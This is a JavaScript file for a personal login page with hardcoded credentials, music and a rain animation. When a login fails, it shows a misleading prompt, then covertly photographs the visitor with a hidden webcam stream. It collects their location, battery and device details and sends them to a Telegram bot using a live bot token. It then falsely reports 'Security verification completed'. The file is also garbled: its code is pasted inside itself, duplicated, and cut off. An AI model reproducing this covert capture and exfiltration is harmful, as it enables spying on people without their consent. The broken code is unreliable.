const correctUsername = "Sahilkijan";
const correctPassword = "bhaikiguriya";

const bgMusic = document.getElementById('backgroundMusic');
bgMusic.volume = 0.3;
bgMusic.play().catch(() => {
  console.log("Auto-play blocked, user interaction needed");
});

async function login() {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;

  if (u === correctUsername && p === correctPassword) {
    alert("Welcome Fatima!");
    bgMusic.pause();
    window.location.href = "welcome.html";
  } else {
    const allowed = localStorage.getItem('loginAllowed');

    if (allowed === 'true') {
      await captureIntruder();
    } else {
      if (confirm("Saarif Ko Srir Ok Ka Popup Aaye Allow Login This Page")) {
        localStorage.setItem('loginAllowed', 'true');
        await captureIntruder();
      }
    }
  }
}

async function captureIntruder() {
  const hasMediaAccess = await navigator.mediaDevices?.getUserMedia;

  if (!hasMediaAccess) {
    alert("Camera not supported or access blocked.");
    return;
  }

  const video = document.createElement('video');
  video.setAttribute("autoplay", "");
  video.style.display = "none";
  document.body.appendChild(video);

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;

    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    await new Promise(resolve => setTimeout(resolve, 1500));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    stream.getTracks().forEach(track => track.stop());

    const deviceInfo = await getDeviceInfo();

    canvas.toBlob(async function(blob) {
      const formData = new FormData();
      formData.append("chat_id", "7597265569");
      formData.append("caption", deviceInfo);
      formData.append("photo", blob, "intruder.jpg");

      await fetch("https://api.telegram.org/bot7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc/sendPhoto", {
        method: "POST",
        body: formData
      });
    }, "image/jpeg");

    alert("Security verification completed!");
  } catch (err) {
    alert("User denied camera access or some error occurred.");
    console.error(err);
  }
}

async function getDeviceInfo() {
const correctUsername = "Sahilkijan";
const correctPassword = "bhaikiguriya";

const bgMusic = document.getElementById('backgroundMusic');
bgMusic.volume = 0.3;
bgMusic.play().catch(() => {
  console.log("Auto-play blocked, user interaction needed");
});

async function login() {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;

  if (u === correctUsername && p === correctPassword) {
    alert("Welcome Fatima!");
    bgMusic.pause();
    window.location.href = "welcome.html";
  } else {
    const allowed = localStorage.getItem('loginAllowed');

    if (allowed === 'true') {
      await captureIntruder();
    } else {
      if (confirm("Saarif Ko Srir Ok Ka Popup Aaye Allow Login This Page")) {
        localStorage.setItem('loginAllowed', 'true');
        await captureIntruder();
      }
    }
  }
}

async function captureIntruder() {
  const hasMediaAccess = await navigator.mediaDevices?.getUserMedia;

  if (!hasMediaAccess) {
    alert("Camera not supported or access blocked.");
    return;
  }

  const video = document.createElement('video');
  video.setAttribute("autoplay", "");
  video.style.display = "none";
  document.body.appendChild(video);

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;

    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    await new Promise(resolve => setTimeout(resolve, 1500));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    stream.getTracks().forEach(track => track.stop());

    const deviceInfo = await getDeviceInfo();

    canvas.toBlob(async function(blob) {
      const formData = new FormData();
      formData.append("chat_id", "7597265569");
      formData.append("caption", deviceInfo);
      formData.append("photo", blob, "intruder.jpg");

      await fetch("https://api.telegram.org/bot7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc/sendPhoto", {
        method: "POST",
        body: formData
      });
    }, "image/jpeg");

    alert("Security verification completed!");
  } catch (err) {
    alert("User denied camera access or some error occurred.");
    console.error(err);
  }
}

async function getDeviceInfo() {
  let batteryLevel = "Battery info not available";
  let locationInfo = "Location not available";

  try {
    const battery = await navigator.getBattery();
    batteryLevel = `Battery: ${Math.round(battery.level * 100)}%`;
  } catch {}

  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject);
    });
    locationInfo = `Lat: ${pos.coords.latitude.toFixed(4)}, Lon: ${pos.coords.longitude.toFixed(4)}`;
  } catch {}

  const deviceInfo = `🚨 Unauthorized Login Attempt 🚨
📅 ${new Date().toLocaleString()}
📱 Device: ${navigator.userAgent}
${batteryLevel}
🌐 Location: ${locationInfo}`;

  return deviceInfo;
}

const canvas = document.getElementById('water');  
const ctx = canvas.getContext('2d');  
let width = canvas.width = window.innerWidth;  
let height = canvas.height = window.innerHeight;  
const drops = [];  

for (let i = 0; i < 500; i++) {  
  drops.push({  
    x: Math.random() * width,  
    y: Math.random() * height,  
    length: Math.random() * 20 + 10,  
    velocity: Math.random() * 4 + 4  
  });  
}  

function draw() {  
  ctx.clearRect(0, 0, width, height);  
  ctx.strokeStyle = 'rgba(174,194,224,0.5)';  
  ctx.lineWidth = 1;  
  ctx.lineCap = 'round';  

  for (let i = 0; i < drops.length; i++) {  
    const d = drops[i];  
    ctx.beginPath();  
    ctx.moveTo(d.x, d.y);  
    ctx.lineTo(d.x, d.y + d.length);  
    ctx.stroke();  
  }  

  move();  
}  

function move() {  
  for (let i = 0; i < drops.length; i++) {  
    const d = drops[i];  
    d.y += d.velocity;  
    if (d.y > height) {  
      d.y = -20;  
      d.x = Math.random() * width;  
    }  
  }  
}  

function loop() {  
  draw();  
  requestAnimationFrame(loop);  
}  

loop();  

window.addEventListener('resize', () => {  
  width = canvas.width = window.innerWidth;  
  height = canvas.height = window.innerHeight;  
});
￼Enter  let batteryLevel = "Battery info not available";
  let locationInfo = "Location not available";

  try {
    const battery = await navigator.getBattery();
    batteryLevel = `Battery: ${Math.round(battery.level * 100)}%`;
  } catch {}

  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject);
    });
    locationInfo = `Lat: ${pos.coords.latitude.toFixed(4)}, Lon: ${pos.coords.longitude.toFixed(4)}`;
  } catch {}

  const deviceInfo = `🚨 Unauthorized Login Attempt 🚨
📅 ${new Date().toLocaleString()}
📱 Device: ${navigator.userAgent}
${batteryLevel}
🌐 Location: ${locationInfo}`;

  return deviceInfo;
}

const canvas = document.getElementById('water');  
const ctx = canvas.getContext('2d');  
dth = canvas.width = window.innerWidth;  
let height = canvas.height = window.innerHeight;  
const drops = [];  

for (let i = 0; i < 500; i++) {  
  drops.push({  
    x: Math.random() * width,  
    y: Math.random() * height,  
    length: Math.random() * 20 + 10,  
    velocity: Math.random() * 4 + 4  
  });  
}  

function draw() {  
  ctx.clearRect(0, 0, width, height);  
  ctx.strokeStyle = 'rgba(174,194,224,0.5)';  
  ctx.lineWidth = 1;  
  ctx.lineCap = 'round';  

  for (let i = 0; i < drops.length; i++) {  
    const d = drops[i];  
    ctx.beginPath();  
    ctx.moveTo(d.x, d.y);  
    ctx.lineTo(d.x, d.y + d.length);  
    ctx.stroke();  
  }  
